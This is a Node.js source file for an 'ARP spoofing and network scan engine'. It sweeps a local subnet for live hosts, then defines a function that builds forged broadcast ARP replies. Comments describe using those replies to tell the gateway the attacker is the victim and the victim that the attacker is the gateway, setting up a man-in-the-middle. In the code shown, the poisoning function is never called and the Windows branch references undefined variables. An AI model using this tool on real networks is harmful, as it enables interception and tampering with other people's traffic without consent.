// arp spoofing and network scan engine
// 
// localhost:8082

/* 
 *
 * SETTINGS
 * 
 */

/*  END  */


/*
 * 
 * GLOBAL VARIABLES
 * 
 */
const isWin   = (process.platform === 'win32')
const isLinux = (process.platform === 'linux')
const isOSX   = (process.platform === 'darwin')

/*  END  */

/*
 * 
 * COMMAND LINE PARAMETERS
 * 
 */
// if (process.getuid() != 0) {
//     console.error('PCAP probably needs root');
//     console.error('Will setuid/gid to owner of .js after pcap session initialized.');
// }
if (process.argv[2] == '--help') {
    console.error("\nExample use: ");
    console.error('  sudo node aprspoof.js [<eth> [<ip_range_start> <ip_range_end> [<our_ip>]]]"');
    console.error('  if args not defined they can be set in the webui');
    console.error('  if ip range not set will be taken from defined eth');
    console.error('  ouriu will be skipped in range. If not defined will be taken from interface information.');
    process.exit(1);
}

/*
 * 
 * LIBRARY DEPENDENCIES
 * 
 * loaded now rather than earlier to prevent unescisary execution of lib code as root
 * 
 */
// Standard libs:
// Our own libs:
// 3rd party
const arp = require('node-arp'); // win/lnx/osx uses exec `ping` and `arp`.
const async = require('async');
/*  END  */


function net_from_ipv4_classc(ipv4) { return ipv4.split('.').slice(0,-1).join('.')+'.0' }
function range_from_ipv4_classc (ipv4) {
    // retuurn start and end tuple
    return [ ipv4.split('.').slice(0,-1).join('.')+'.1', 
             ipv4.split('.').slice(0,-1).join('.')+'.254']
}

const requestednetinterface = process.argv[2] || null;
let   netinterface;
let   ip_range_start        = process.argv[3] || null;
let   ip_range_end          = process.argv[4] || null;
let   myip                  = process.argv[5] || null;


console.log('\nNetwork interfaces:');
// linux:   {'wlan0': [{address:...},{}], {'eth0'...}}
// osx:     {'en1':   [{address:...},{}], {'en0'...}}
// windows: {'WLAN':  [{address:...},{}], {'Ethernet Interface 1'...}}
Object.entries(require('os').networkInterfaces()).forEach(entry => {
    let devicename = entry[0]
    if (requestednetinterface === devicename) {
        console.log(`${devicename} <--- chosen`);
        netinterface = requestednetinterface;
    }
    else
        console.log(`${devicename}`);
    if (entry[1].length > 0) {
        if (!myip && netinterface === devicename) // assume first addr is ours
            myip = entry[1][0].address;
        entry[1].forEach(address => {
            console.log(` ${address.address} / ${address.netmask}`) 
        });
    }
    else
        console.log(' no address\n');
});

if (netinterface && ! ip_range_start) {
    [ip_range_start, ip_range_end] = range_from_ipv4_classc(myip);
}


console.log('\nSettings');
if (netinterface) {
    console.log(`interface : '${netinterface}'`);
    console.log(` ip range : '${ip_range_start}' to '${ip_range_end}'`);
    console.log(`    my ip : '${myip}'`);
}
else {
    console.error(`! Couldn't not find requested interface ${requestednetinterface}`)
    console.error('! Will wait for usre to define in webui')
}


// Do the following as root and then downgrade, if we are root
if (isLinux || isOSX) {
    const pcap = require("pcap");
    try {
        pcap_session = pcap.createSession(netinterface, "arp");
    } catch (e) {
        console.error('\nError: pcap could not createSession\n\n',e)
        process.exit(1)
    }
    // dowgrade permissions:
    if (process.getuid() == 0) {
        require('fs').stat(__filename, function(err,s) {
            console.log(`Downgrade permissions: change process uid/gid found on file\n\"${__filename}\"\nowner/group: ${s.uid}/${s.gid}`);
            process.setgid(s.gid);
            process.setuid(s.uid);
        });
    }
}


/*
 * 
 * PROCESS CONTROL (stop, stdin control)
 * 
 */                    
//                          ip we tell and convince -------.
//                          ip we want to control --v      v
// poison_packet('11:11:11:11:11:11','1.1.1.1','2.2.2.2','3.3.3.3')
// typically we would tell the gateway we are the victim's ip 
//  and tell the victim we are the gateway
function poison_packet(ourmac, ourip, victimip, tellip) {
    // based on https://github.com/skepticfx/arpjs/blob/master/lib/packet.js#L53 (MIT)
    // but here so can make windows compatible and reduce dependencies
    // turn '00:00:00:..' into ['0x00','0x00'] which new Buffer is fine with converting
    if (typeof ourmac    === 'string')    ourmac = ourmac.split(':').map(x=>'0x'+x)
    if (typeof ourip     === 'string')     ourip = ourip.split('.')
    if (typeof tellip    === 'string')    tellip = tellip.split('.')
    if (typeof victimip  === 'string')  victimip = victimip.split('.')
    return new Buffer.from([
        // ETHERNET
        // 0    = Destination MAC
        //  pkt.dst = macToArr(pktObj.dst_mac) // tell: 'ff:ff:ff:ff:ff:ff'
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,    //  broadcast
        // 6    = Source MAC
        // pkt.src = macToArr(macAddr)        // this machines mac 
        ourmac[0], ourmac[1], ourmac[2], 
        ourmac[3], ourmac[4], ourmac[5],       
        0x08, 0x06,   // 12   = EtherType = ARP
        // ARP
        0x00, 0x01,   // 14/0   = Hardware Type = Ethernet (or wifi)
        0x08, 0x00,   // 16/2   = Protocol type = ipv4 (request ipv4 route info)
        0x06, 0x04,   // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
        0x00, 0x02,   // 20/6   = Operation (ARP, who-has) 01=request,02=reply
        // 22/8   = Sender Hardware Addr (MAC)
        // pkt.src_mac = macToArr(macAddr)        // this machines mac
        ourmac[0], ourmac[1], ourmac[2], 
        ourmac[3], ourmac[4], ourmac[5],        
        // 28/14  = Sender Protocol address (ipv4)
        // pkt.src_ip = ipToArr(pktObj.src_ip)    // victum: e.g. gw
        victimip[0], victimip[1], victimip[2], victimip[3], 
        // 32/18  = Target Hardware Address (Blank/nulls for who-has)
        // pkt.src_ip = ipToArr(pktObj.src_ip)    // victum: e.g. gw
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
        // 38/24  = Target Protocol address (ipv4)
        // pkt.dst_ip = ipToArr(pktObj.dst_ip)    // tell: e.g. host
        tellip[0], tellip[1], tellip[2], tellip[3] 
        ]);
}


if (isWin) {
    const cap = require('cap');
    var cap_session = new cap.Cap();
    var buffer = Buffer.alloc(65535);
    cap_linktype = cap_session.open(netinterface, "arp", 10 * 1024 * 1024, buffer);
    console.log('linkType',cap_linktype)
    cap_session.on('packet', (nbytes,trunc) => {
        console.log('respose')
        if (linkType === 'ETHERNET') {
            var ret = decoders.Ethernet(buffer);
            console.log(ret);
        }
    })
    function send(packet) {
        console.log('cap send')
        try {
        // send will not work if pcap_sendpacket is not supported by underlying `device`
             c.send(packet, packet.length);
        } catch (e) {
            console.error("Error sending packet (cap):", e);
        }
    }
}
else {
    // pcap_session was setup earlier in scrip while we still had root permissions
    function send(packet){
        console.log('pcap send')
        try {
            pcap_session.inject(packet);
        }  catch (e) {
            console.error("Error sending packet (pcap):", e);
        }
    }
}



/*
 *
 * FEATURE METHODS
 * 
 */
let activehosts = {};
function find_active_hosts(callback, ipv4_start, ipv4_end, ipv4_filter) {
    // filter is []  containing ip's we ignore. such as myip and targets we already found
    const prefix = ipv4_start.split('.').slice(0,-1).join('.');
    const start  = parseInt(ipv4_start.split('.').slice(-1)[0]);
    const end    = parseInt(ipv4_end.split('.').slice(-1)[0]);
    var count = 0;
    for (var i = start; i <= end; i++) {
        const ip = prefix+'.'+i;
        if (ipv4_filter && ipv4_filter.includes(ip)) {
            console.log(`filter out ${ip}`)
            count += 1;
            continue;
        }
        //ping and if host alive get mac
        console.log(`try ${ip}`)
        arp.getMAC(ip, (err, mac) => {
            count += 1;
            console.log(`tried ${count}: ${ip}`)
            if (err) 
                console.error('error arp.getMAC:',err);
            else if (mac.split(':').length != 6)
                console.error('mac invalid arp.getMAC:',mac);
            else 
                activehosts[mac] = ip;
            if (count === (end-start)+1 && typeof callback === 'function')
                callback(null)
        });
    }
}




async.waterfall([
    function (callback) {
        find_active_hosts(callback, ip_range_start,ip_range_end , [myip])
    },
    function (callback) {
        console.log('activehosts',activehosts)    
        callback(null)
    }
],console.log)

